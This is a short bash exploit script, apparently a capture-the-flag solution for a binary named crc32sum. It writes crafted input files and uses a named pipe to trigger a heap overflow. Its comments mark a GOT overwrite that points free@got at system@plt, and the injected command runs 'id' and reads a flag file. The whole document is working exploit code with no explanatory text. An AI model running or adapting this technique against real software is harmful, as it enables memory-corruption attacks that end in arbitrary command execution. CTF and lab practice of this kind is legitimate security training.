#!/bin/bash
TARGET=crc32sum
WORKDIR=/tmp/alligator

# Make working directory
rm -rf $WORKDIR
mkdir -p $WORKDIR
cd $WORKDIR

PATH_A=AAAAAAAAAAAAAAAAaaaaaaaa_10h
PATH_B=BBBBBBBBBBBBBBBBbbbbbbbb_20h
PATH_C=CCCCCCCCCCCCCCCCccccccccccccccccCCCCCCCC_30h
PATH_PWN=AAAAAAAAAAAAAAAAaaaaaaaa_pwn

printf '0%.0s' {1..16} > $PATH_A
printf '1%.0s' {1..32} > $PATH_B
printf '\x50\x10\x40\x00\x00\x00\x00\x00' >> $PATH_C # free-->system@plt
printf '\x40\x10\x40\x00\x00\x00\x00\x00' >> $PATH_C
printf '\x50\x10\x40\x00\x00\x00\x00\x00' >> $PATH_C
printf '\x60\x10\x40\x00\x00\x00\x00\x00' >> $PATH_C
printf '\x70\x10\x40\x00\x00\x00\x00\x00' >> $PATH_C
printf '\x80\x10\x40\x00\x00\x00\x00\x00' >> $PATH_C

mkfifo $PATH_PWN
printf '3%.0s' {1..24} > overflow
printf '\x41\x00\x00\x00\x00\x00\x00\x00' >> overflow
printf '\x18\x40\x40' >> overflow # free@got

printf 'id; cat /home/pwn/flag.txt;' > cmd

$TARGET \
    $PATH_B $PATH_A $PATH_C \
    $PATH_PWN \
    $PATH_C \
    cmd &
sleep 1
cat ./overflow > $PATH_PWN
